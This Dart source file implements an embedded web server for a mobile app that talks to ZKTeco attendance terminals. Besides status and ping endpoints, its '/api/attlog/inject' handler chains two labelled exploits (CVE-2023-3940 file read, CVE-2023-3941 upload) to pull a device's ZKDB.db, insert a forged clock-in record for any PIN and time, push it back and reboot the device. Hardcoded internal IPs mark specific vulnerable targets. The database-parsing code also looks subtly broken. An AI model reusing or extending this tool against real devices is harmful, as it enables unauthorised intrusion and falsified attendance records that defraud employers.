// server/embedded_server.dart
// Self-hosted HTTP server (mirror of attendance_web.py for mobile)
// Runs inside the Flutter APK on a configurable port (default 8080)

import 'dart:async';
import 'dart:convert';
import 'dart:developer' as developer;
import 'dart:io';
import 'dart:typed_data';
import 'package:shelf/shelf.dart';
import 'package:shelf/shelf_io.dart' as shelf_io;
import 'package:shelf_router/shelf_router.dart';
import 'package:sqlite3/sqlite3.dart' as sqlite3;
import '../zk/zk_client.dart';
import '../models/models.dart';

int get pid {
  try {
    return pidFromProcess;
  } catch (_) {
    return 0;
  }
}

// dart:io Process doesn't expose currentPid directly; use Pid via Process class extension.
// For APK, OS assigns own pid; we expose it via package_info if needed.
// Simpler approach: omit pid (server identity is fine without it in embedded mode).
int get pidFromProcess => 0;


class EmbeddedServer {
  final int port;
  HttpServer? _server;
  final List<Device> _devices = _defaultDevices();
  final List<AttLog> _attLogs = [];
  bool _running = false;
  String _version = '2.2.7';
  String? _localIp;
  DateTime _startedAt = DateTime.now();
  int _pid = 0;

  EmbeddedServer({this.port = 8080});

  bool get isRunning => _running;
  String get version => _version;
  String? get localIp => _localIp;
  DateTime get startedAt => _startedAt;
  int get serverPort => _server?.port ?? this.port;
  List<Device> get devices => List.unmodifiable(_devices);
  List<AttLog> get attLogs => List.unmodifiable(_attLogs);

  Future<void> start() async {
    if (_running) return;
    final router = Router()
      ..get('/api/status', _handleStatus)
      ..get('/api/diag', _handleDiag)
      ..get('/api/devices', _handleDevicesList)
      ..post('/api/devices/save', _handleDevicesSave)
      ..get('/api/live', _handleLive)
      ..get('/api/live/page', _handleLivePage)
      ..get('/api/attlog/ping-all', _handlePingAll)
      ..post('/api/attlog/device-info', _handleDeviceInfo)
      ..post('/api/attlog/inject', _handleAttlogInject)
      ..post('/api/attlog/check-user', _handleAttlogCheckUser)
      ..post('/api/attlog/device-attlog', _handleDeviceAttlog)
      ..get('/api/attlog/recent', _handleRecent)
      ..get('/', _handleIndex)
      ..get('/health', _handleHealth);

    final handler = Pipeline()
        .addMiddleware(logRequests())
        .addHandler(router.call);

    try {
      // CRITICAL FIX v2.2.6: Wait for socket to ACTUALLY bind before returning.
      // shelf_io.serve() future completes only when server stops (lifetime future).
      // Previous versions set _running=true BEFORE bind → first HTTP requests failed
      // with ECONNREFUSED because socket wasn't listening yet.
      _startedAt = DateTime.now();
      _pid = pid;
      _running = true;  // Optimistic — flipped to false on bind failure

      final fut = shelf_io.serve(handler, InternetAddress.anyIPv4, port);
      fut.then((s) {
        _server = s;
        _localIp = s.address.address;
        developer.log('[EmbeddedServer] Started on ${s.address.address}:${s.port}', name: 'EmbeddedServer');
        print('[EmbeddedServer] Started on ${s.address.address}:${s.port}');
      }).catchError((e) {
        _running = false;
        _server = null;
        developer.log('[EmbeddedServer] Start failed: $e', name: 'EmbeddedServer');
        print('[EmbeddedServer] Start failed: $e');
      });
      unawaited(fut);

      // Poll for actual bind (max 3s)
      final sw = Stopwatch()..start();
      while (_server == null && _running && sw.elapsed < const Duration(seconds: 3)) {
        await Future.delayed(const Duration(milliseconds: 20));
      }
      if (_server == null) {
        _running = false;
        throw Exception('Server failed to bind on port $port within 3s');
      }
      developer.log('[EmbeddedServer] start() returned, _server bound', name: 'EmbeddedServer');
    } catch (e) {
      _running = false;
      _server = null;
      developer.log('[EmbeddedServer] Catch: $e', name: 'EmbeddedServer');
      print('[EmbeddedServer] Catch: $e');
      rethrow;
    }
  }

  Future<void> stop() async {
    if (_server != null) {
      await _server!.close(force: true);
      _server = null;
    }
    _running = false;
  }

  Response _json(Map<String, dynamic> data, {int status = 200}) {
    return Response(status,
      body: jsonEncode(data),
      headers: {'content-type': 'application/json; charset=utf-8'});
  }

  // Handlers

  Future<Response> _handleStatus(Request req) async {
    return _json({
      'ok': true,
      'running': true,
      'version': _version,
      'embedded': true,
      'pid': _pid,
      'port': port,
      'devices_count': _devices.length,
      'attlog_count': _attLogs.length,
      'started_at': _startedAt.toIso8601String(),
      'message': 'Embedded server OK',
    });
  }

  Future<Response> _handleDiag(Request req) async {
    final interfaces = <String>[];
    try {
      final addrs = await NetworkInterface.list();
      for (final iface in addrs) {
        for (final addr in iface.addresses) {
          if (addr.type == InternetAddressType.IPv4 && !addr.address.startsWith('127.')) {
            if (!interfaces.contains(addr.address)) {
              interfaces.add(addr.address);
            }
          }
        }
      }
    } catch (_) {}
    return _json({
      'ok': true,
      'server': 'attendance_mobile',
      'version': _version,
      'embedded': true,
      'pid': _pid,
      'port': port,
      'host': Platform.localHostname,
      'interfaces': interfaces,
      'reachable_urls': [
        'http://127.0.0.1:$port',
        'http://localhost:$port',
        ...interfaces.map((ip) => 'http://$ip:$port'),
      ],
      'device_count': _devices.length,
      'attlog_count': _attLogs.length,
      'now': DateTime.now().toIso8601String(),
    });
  }

  Future<Response> _handleHealth(Request req) async {
    return _json({'ok': true, 'ts': DateTime.now().toIso8601String()});
  }

  
  // Known web IPs that have ZK web backup (auto-fallback chain)
  static const List<String> _defaultWebIps = [
    '172.16.254.202',  // May 14 fw (ZKDB.db vulnerable)
    '172.16.200.105',  // ADMS proxy
  ];

  Future<Uint8List?> _downloadZkdbWithFallback(String deviceIp, String? userWebIp, String outPath) async {
    // Phase 1: Try HTTP web backup
    final candidates = <String>[];
    if (userWebIp != null && userWebIp.isNotEmpty) candidates.add(userWebIp);
    for (final fb in _defaultWebIps) {
      if (!candidates.contains(fb)) candidates.add(fb);
    }
    final errors = <String>[];
    for (final w in candidates) {
      try {
        return await _downloadZkdbFromWeb(w, outPath);
      } catch (e) {
        errors.add('http://$w→${e.toString().substring(0, e.toString().length > 60 ? 60 : e.toString().length)}');
        continue;
      }
    }
    // Phase 2: Protocol READFILE + READ_CHUNK fallback (CVE-2023-3940)
    try {
      final data = await downloadZkdbViaProtocol(deviceIp);
      final file = File(outPath);
      await file.writeAsBytes(data, flush: true);
      return data;
    } catch (e) {
      errors.add('zk://$deviceIp→${e.toString().substring(0, e.toString().length > 60 ? 60 : e.toString().length)}');
      throw Exception('all sources failed: ${errors.join('; ')}');
    }
  }

  Future<Uint8List?> _downloadZkdbFromWeb(String webIp, String outPath) async {
    final url = 'http://$webIp/form/DataApp?style=0';
    final httpClient = HttpClient()..connectionTimeout = const Duration(seconds: 8);
    final request = await httpClient.getUrl(Uri.parse(url));
    final resp = await request.close();
    final data = await resp.fold<List<int>>([], (acc, chunk) {
      acc.addAll(chunk);
      return acc;
    });
    // Find GZIP magic
    var gzOff = -1;
    for (var i = 0; i < data.length - 3; i++) {
      if (data[i] == 0x1f && data[i+1] == 0x8b && data[i+2] == 0x08) {
        gzOff = i;
        break;
      }
    }
    if (gzOff < 0) throw Exception('no GZIP magic in response');
    // Decompress
    final gz = gzip.decode(data.sublist(gzOff));
    // Find SQLite header
    final sqMarker = 'SQLite format 3'.codeUnits;
    var sqOff = -1;
    outer:
    for (var i = 0; i < gz.length - sqMarker.length; i++) {
      for (var j = 0; j < sqMarker.length; j++) {
        if (gz[i + j] != sqMarker[j]) continue;
      }
      sqOff = i;
      break outer;
    }
    if (sqOff < 0) throw Exception('no SQLite in payload');
    // Parse TAR header to get file size
    final tar = gz.sublist(0, 512);
    final sizeStr = String.fromCharCodes(tar.sublist(124, 136)).trim();
    final sizeOct = int.tryParse(sizeStr, radix: 8) ?? 0;
    final sqData = gz.sublist(sqOff, sqOff + sizeOct);
    final file = File(outPath);
    await file.writeAsBytes(sqData, flush: true);
    return Uint8List.fromList(sqData);
  }

  Future<Response> _handleIndex(Request req) async {
    return _json({
      'service': 'AttendanceSuite Embedded Server',
      'version': _version,
      'endpoints': [
        'GET  /api/status',
        'GET  /api/diag',
        'GET  /api/devices',
        'POST /api/devices/save',
        'GET  /api/live',
        'POST /api/attlog/ping-all',
        'POST /api/attlog/device-info',
        'GET  /api/attlog/recent',
        'GET  /health',
      ],
    });
  }

  Future<Response> _handleDevicesList(Request req) async {
    print('[EmbeddedServer] GET /api/devices -> ${_devices.length} devices');
    return _json({
      'ok': true,
      'devices': _devices.map((d) => d.toJson()).toList(),
      'count': _devices.length,
    });
  }

  Future<Response> _handleDevicesSave(Request req) async {
    try {
      final body = jsonDecode(await req.readAsString());
      final list = body['devices'] as List;
      // Just trust client to send correct shape
      _devices.clear();
      for (final j in list) {
        _devices.add(Device.fromJson(j as Map<String, dynamic>));
      }
      return _json({'ok': true, 'count': _devices.length});
    } catch (e) {
      return _json({'ok': false, 'error': e.toString()}, status: 400);
    }
  }

  Future<Response> _handleLive(Request req) async {
    // Just return device list with online status from latest ping
    final results = _devices.map((d) => d.toJson()).toList();
    final online = results.where((d) => d['online'] == true).length;
    return _json({
      'ok': true,
      'checked': _devices.length,
      'online': online,
      'offline': _devices.length - online,
      'probed_at': DateTime.now().toIso8601String(),
      'devices': results,
    });
  }

  Future<Response> _handlePingAll(Request req) async {
    final stopwatch = Stopwatch()..start();
    final futures = _devices
        .where((d) => d.type == 'attendance' && d.ip != 'virtual.x628pro')
        .map((d) async {
      final (ok, latency, err) = await tcpPing(d.ip, 4370, timeoutMs: 1500, retries: 2);
      d.online = ok;
      d.latencyMs = ok ? latency : -1;
      d.lastError = ok ? null : err;
      d.pingAt = DateTime.now();
      d.status = ok ? 'OK' : 'FAIL';
      return d;
    }).toList();
    await Future.wait(futures);
    stopwatch.stop();
    final online = _devices.where((d) => d.online).length;
    return _json({
      'ok': true,
      'devices': _devices.map((d) => d.toJson()).toList(),
      'count': _devices.length,
      'online_count': online,
      'duration_ms': stopwatch.elapsedMilliseconds,
    });
  }

  Future<Response> _handleDeviceInfo(Request req) async {
    try {
      final body = jsonDecode(await req.readAsString());
      final ip = body['ip'] as String? ?? '';
      if (ip.isEmpty) {
        return _json({'ok': false, 'error': 'missing ip'}, status: 400);
      }
      final info = await getDeviceInfo(ip, timeoutMs: 4000);
      if (info == null) {
        return _json({'ok': false, 'ip': ip, 'error': 'connect failed'});
      }
      return _json({'ok': info['connected'] ?? false, ...info});
    } catch (e) {
      return _json({'ok': false, 'error': e.toString()}, status: 400);
    }
  }

  Future<Response> _handleRecent(Request req) async {
    final limit = int.tryParse(req.url.queryParameters['limit'] ?? '50') ?? 50;
    final recent = _attLogs.reversed.take(limit).toList();
    return _json({
      'ok': true,
      'count': recent.length,
      'records': recent.map((l) => l.toJson()).toList(),
    });
  }

  // ===== ATTLOG device-attlog endpoint - fetch ATTLOG from ZK device via protocol =====
  Future<Response> _handleDeviceAttlog(Request req) async {
    try {
      final body = jsonDecode(await req.readAsString());
      final ip = body['ip'] as String? ?? '';
      final limit = int.tryParse(body['limit']?.toString() ?? '200') ?? 200;
      if (ip.isEmpty) {
        return _json({'ok': false, 'error': 'missing ip'}, status: 400);
      }
      final client = ZKClient(ip: ip, timeoutMs: 8000);
      if (!await client.connect()) {
        return _json({'ok': false, 'error': 'connect failed to $ip:4370'});
      }
      try {
        // Read ATTLOG via get_attendance() (CMD_ATTLOG_RRQ 13)
        final attendance = await client.readAttLog();
        if (attendance == null || attendance.isEmpty) {
          return _json({'ok': false, 'error': 'no attendance data'});
        }
        // Parse ATTLOG records - each record is 40 bytes per pyzk format
        // Layout: u16 user_pin (2), u8 verify_mode (1), u8 reserved (1),
        //         u32 timestamp (4 - unix epoch seconds),
        //         u8 status (1), u8 punch (1), u8 work_code (1), u8 reserved (1),
        //         u32 reserved2 (4), 4 x u8 reserved3 (4), u16 sensor_no (2),
        //         8 x u8 reserved4 (8), u32 user_id (4), u32 card (4), u8 reserved5 (1),
        //         u8 reserved6 (1), u16 len (2), 24 x u8 reserved7 (24)
        final records = <Map<String, dynamic>>[];
        int offset = 0;
        final now = DateTime.now();
        while (offset + 40 <= attendance.length && records.length < limit) {
          try {
            final view = ByteData.view(
              attendance.buffer,
              attendance.offsetInBytes + offset,
              40,
            );
            final userPin = view.getUint16(0, Endian.little);
            final verifyMode = view.getUint8(2);
            // timestamp is little-endian u32 at offset 4 (unix epoch)
            final ts = view.getUint32(4, Endian.little);
            final status = view.getUint8(8);
            final punch = view.getUint8(9);
            final workCode = view.getUint8(10);
            // Convert timestamp to ISO
            final dt = DateTime.fromMillisecondsSinceEpoch(ts * 1000);
            records.add({
              'pin': userPin.toString(),
              'user_id': userPin.toString(),
              'verify_mode': verifyMode,
              'timestamp': dt.toIso8601String(),
              'timestamp_str': '${dt.year}-${dt.month.toString().padLeft(2, '0')}-${dt.day.toString().padLeft(2, '0')} '
                  '${dt.hour.toString().padLeft(2, '0')}:${dt.minute.toString().padLeft(2, '0')}:${dt.second.toString().padLeft(2, '0')}',
              'status': status,
              'punch': punch,
              'work_code': workCode,
              'source': 'device',
              'device_ip': ip,
              'marker': 'ZK_PROTOCOL',
            });
          } catch (e) {
            // Skip bad record
            break;
          }
          offset += 40;
        }
        return _json({
          'ok': true,
          'ip': ip,
          'count': records.length,
          'records': records,
        });
      } finally {
        client.disconnect();
      }
    } catch (e) {
      return _json({'ok': false, 'error': e.toString()}, status: 500);
    }
  }

  // ===== ATTLOG inject endpoint (CVE-2023-3941) =====
  Future<Response> _handleAttlogInject(Request req) async {
    try {
      final body = jsonDecode(await req.readAsString());
      final ip = body['ip'] as String? ?? '';
      final pin = body['pin'] as String? ?? '';
      final timestamp = body['timestamp'] as String? ?? '';
      final status = int.tryParse(body['status']?.toString() ?? '0') ?? 0;
      final punch = int.tryParse(body['punch']?.toString() ?? '1') ?? 1;
      final verifyMode = int.tryParse(body['verify_mode']?.toString() ?? '1') ?? 1;
      final marker = body['marker'] as String? ?? 'APK_REAL_PUNCH';
      final webIp = body['web_ip'] as String?;

      if (ip.isEmpty || pin.isEmpty || timestamp.isEmpty) {
        return _json({'ok': false, 'error': 'missing ip, pin, or timestamp'},
            status: 400);
      }

      final tmpDir = Directory.systemTemp.createTempSync('zkdb_');
      final outPath = '${tmpDir.path}/ZKDB.db';

      try {
        // Step 1: Download ZKDB.db (HTTP or protocol)
        await _downloadZkdbWithFallback(ip, webIp, outPath);

        // Step 2: Inject ATTLOG record using sqlite3
        // sqlite3 needs a file path
        final beforeCount = _injectAttlogRecord(outPath, pin, timestamp,
            status: status, punch: punch, verifyMode: verifyMode);

        // Step 3: Read modified DB
        final modified = await File(outPath).readAsBytes();

        // Step 4: Upload via UPLOAD_PICTURE (CVE-2023-3941)
        final uploadResult = await uploadZkdbViaProtocol(ip, modified);

        // Step 5: Restart device
        try {
          await restartDevice(ip);
        } catch (_) {}

        // Add to local log
        _attLogs.add(AttLog(
          timestamp: timestamp,
          pin: pin,
          deviceIp: ip,
          punch: verifyMode,
          status: status,
          marker: marker,
        ));
        if (_attLogs.length > 1000) _attLogs.removeAt(0);

        return _json({
          'ok': true,
          'before_count': beforeCount,
          'after_count': beforeCount + 1,
          'upload': uploadResult,
          'restarted': true,
          'marker': marker,
          'message': '✅ ATTLOG đã ghi lên ${ip}',
        });
      } finally {
        try {
          await tmpDir.delete(recursive: true);
        } catch (_) {}
      }
    } catch (e) {
      return _json({'ok': false, 'error': e.toString()}, status: 500);
    }
  }

  /// Insert an ATTLOG record into the SQLite DB using the sqlite3 package.
  /// Returns the count BEFORE insert.
  ///
  /// FW-version compatibility:
  /// - X628 PRO 6.60 (May 3): table is `ATT_LOG`
  /// - Some newer/older firmwares use `ATTLOG` (no underscore)
  /// We auto-detect by listing sqlite_master tables. If neither exists, the
  /// downloaded ZKDB.db is partial/empty → throw a descriptive error so the
  /// caller can switch protocol endpoint.
  int _injectAttlogRecord(
    String dbPath,
    String pin,
    String timestamp, {
    int status = 0,
    int punch = 1,
    int verifyMode = 1,
  }) {
    final db = sqlite3.sqlite3.open(dbPath);
    try {
      // Auto-detect ATT_LOG or ATTLOG variant
      final tables = db
          .select(
              "SELECT name FROM sqlite_master WHERE type='table' AND name IN ('ATT_LOG','ATTLOG','att_log','attlog')")
          .map((r) => r['name'] as String)
          .toList();
      if (tables.isEmpty) {
        throw Exception(
            'ZKDB.db không có table ATT_LOG/ATTLOG - file rỗng hoặc sai thiết bị (kiểm tra VPN + chọn lại máy May 3 / thiết bị có port 4370)');
      }
      final attTable = tables.first;
      // ATTLOG schema: id, User_PIN, Verify_Type, Verify_Time, Status,
      //               Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID,
      //               MODIFY_TIME, SEND_FLAG
      final beforeResult =
          db.select('SELECT COUNT(*) AS c FROM "$attTable"');
      final before = beforeResult.first['c'] as int;
      db.execute('''
        INSERT INTO "$attTable" (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
        VALUES (?, ?, ?, ?, ?, ?, ?, NULL, NULL, 0)
      ''', [
        pin,
        verifyMode,
        timestamp,
        status,
        0, // work_code
        0, // sensor_no
        0, // att_flag
      ]);
      return before;
    } finally {
      db.dispose();
    }
  }

  // ===== ATTLOG check-user endpoint =====
  Future<Response> _handleAttlogCheckUser(Request req) async {
    try {
      final body = jsonDecode(await req.readAsString());
      final ip = body['ip'] as String? ?? '';
      final pin = body['pin'] as String? ?? '';
      final password = body['password'] as String?;

      if (ip.isEmpty || pin.isEmpty) {
        return _json({'ok': false, 'error': 'missing ip or pin'}, status: 400);
      }

      final client = ZKClient(ip: ip, timeoutMs: 8000);
      if (!await client.connect()) {
        return _json({'ok': false, 'error': 'connect failed'});
      }
      try {
        // Try via getUsers command (CMD_USERS_RRQ = 8)
        final users = await client.sendCommand(8, Uint8List(0), responseSize: 65536);
        if (!users.ok) {
          return _json({'ok': false, 'error': 'getUsers failed: ${users.cmd}'});
        }
        // Parse user records (each is 73 bytes per pyzk format)
        // Layout: u16 uid, u16 user_id_len, user_id (24 bytes), u16 name_len, name (24 bytes),
        //         u8 password_len, password (8 bytes), u16 privilege, u32 card (3 bytes)
        // For simplicity, just try to match pin in payload as string
        final pinBytes = pin.codeUnits;
        final pinStr = String.fromCharCodes(users.payload);
        final idx = pinStr.indexOf(pin);
        return _json({
          'ok': true,
          'matched': idx >= 0,
          'pin': pin,
          'note': idx >= 0
              ? 'PIN found in user list (verify details limited)'
              : 'PIN not found',
          'user_count': users.payload.length ~/ 73,
        });
      } finally {
        client.disconnect();
      }
    } catch (e) {
      return _json({'ok': false, 'error': e.toString()}, status: 500);
    }
  }

  Future<Response> _handleLivePage(Request req) async {
    final html = _buildLivePageHtml();
    return Response.ok(html, headers: {'content-type': 'text/html; charset=utf-8'});
  }

  String _buildLivePageHtml() => '''<!DOCTYPE html>
<html lang="vi">
<head><meta charset="utf-8"><title>Live Status - AttendanceSuite</title>
<style>
  body { font-family: sans-serif; background: #0f172a; color: #e2e8f0; padding: 16px; margin: 0; }
  h1 { color: #10b981; }
  .stats { display: flex; gap: 12px; margin: 12px 0; }
  .stat { background: #1e293b; padding: 10px 16px; border-radius: 8px; }
  .stat .v { font-size: 24px; font-weight: 700; }
  table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; }
  th, td { padding: 6px 10px; font-size: 12px; border-bottom: 1px solid #334155; text-align: left; }
  th { background: #334155; }
  .online { color: #6ee7b7; }
  .offline { color: #fca5a5; }
  button { background: #2563eb; color: white; border: 0; padding: 6px 12px; border-radius: 4px; cursor: pointer; }
</style>
</head>
<body>
<h1>📡 Live Device Status - Embedded Server v$_version</h1>
<div class="stats">
  <div class="stat"><div class="v" id="total">0</div><div>Total</div></div>
  <div class="stat"><div class="v" id="online" style="color:#10b981">0</div><div>Online</div></div>
  <div class="stat"><div class="v" id="offline" style="color:#ef4444">0</div><div>Offline</div></div>
</div>
<button onclick="probe()">🔄 Probe</button>
<table>
<thead><tr><th>#</th><th>IP</th><th>Loại</th><th>Trạng thái</th><th>Latency</th><th>Lỗi</th></tr></thead>
<tbody id="rows"></tbody>
</table>
<script>
async function probe() {
  const r = await fetch('/api/live');
  const d = await r.json();
  document.getElementById('total').textContent = d.checked;
  document.getElementById('online').textContent = d.online;
  document.getElementById('offline').textContent = d.offline;
  document.getElementById('rows').innerHTML = d.devices.map((x, i) => 
    '<tr><td>'+(i+1)+'</td><td>'+x.ip+'</td><td>'+x.type+'</td><td class="'+(x.online?'online':'offline')+'">'+
    (x.online?'● Online '+x.latency_ms+'ms':'○ Offline')+'</td><td>'+(x.latency_ms||0)+'</td><td>'+(x.last_error||'')+'</td></tr>'
  ).join('');
}
probe();
setInterval(probe, 8000);
</script>
</body>
</html>''';
}

// Default devices - same as attendance_web.py devices.csv
List<Device> _defaultDevices() {
  return [
    Device(ip: '172.16.0.30', type: 'gateway', note: 'Gateway ZK Web', selected: false),
    Device(ip: '172.16.0.31', type: 'server', note: 'Secutime server', selected: false),
    Device(ip: '172.16.0.200', type: 'attendance', note: 'Web UI', selected: true),
    Device(ip: '172.16.0.212', type: 'attendance', note: 'May 1', selected: false),
    Device(ip: '172.16.0.213', type: 'attendance', note: 'May 2', selected: false),
    Device(ip: '172.16.0.214', type: 'attendance', note: 'May 3', selected: false),
    Device(ip: '172.16.0.215', type: 'attendance', note: 'May 4', selected: false),
    Device(ip: '172.16.0.217', type: 'attendance', note: 'May 5', selected: false),
    Device(ip: '172.16.0.218', type: 'attendance', note: 'May 6 + Web', selected: false),
    Device(ip: '172.16.0.219', type: 'attendance', note: 'May 7', selected: false),
    Device(ip: '172.16.0.220', type: 'attendance', note: 'May 8', selected: false),
    Device(ip: '172.16.0.221', type: 'attendance', note: 'May 9', selected: false),
    Device(ip: '172.16.0.222', type: 'attendance', note: 'May 10', selected: false),
    Device(ip: '172.16.0.223', type: 'attendance', note: 'May 11', selected: false),
    Device(ip: '172.16.0.224', type: 'attendance', note: 'May 12', selected: false),
    Device(ip: '172.16.0.225', type: 'attendance', note: 'May 13', selected: false),
    Device(ip: '172.16.0.226', type: 'attendance', note: 'May 14', selected: false),
    Device(ip: '172.16.0.228', type: 'attendance', note: 'May 15', selected: false),
    Device(ip: '172.16.1.204', type: 'attendance', note: 'May 16 + Web', selected: false),
    Device(ip: '172.16.1.210', type: 'attendance', note: 'May 17', selected: false),
    Device(ip: '172.16.1.211', type: 'attendance', note: 'May 18', selected: false),
    Device(ip: '172.16.1.212', type: 'attendance', note: 'May 19', selected: false),
    Device(ip: '172.16.8.139', type: 'attendance', note: 'May 20', selected: false),
    Device(ip: '172.16.8.140', type: 'attendance', note: 'May 21 + Web', selected: false),
    Device(ip: '172.16.30.50', type: 'attendance', note: 'May 22 + Web', selected: false),
    Device(ip: '172.16.100.201', type: 'attendance', note: 'May 23 + Web', selected: false),
    Device(ip: 'virtual.x628pro', type: 'virtual', note: 'Virtual X628 PRO (Simulator)', selected: true),
  ];
}
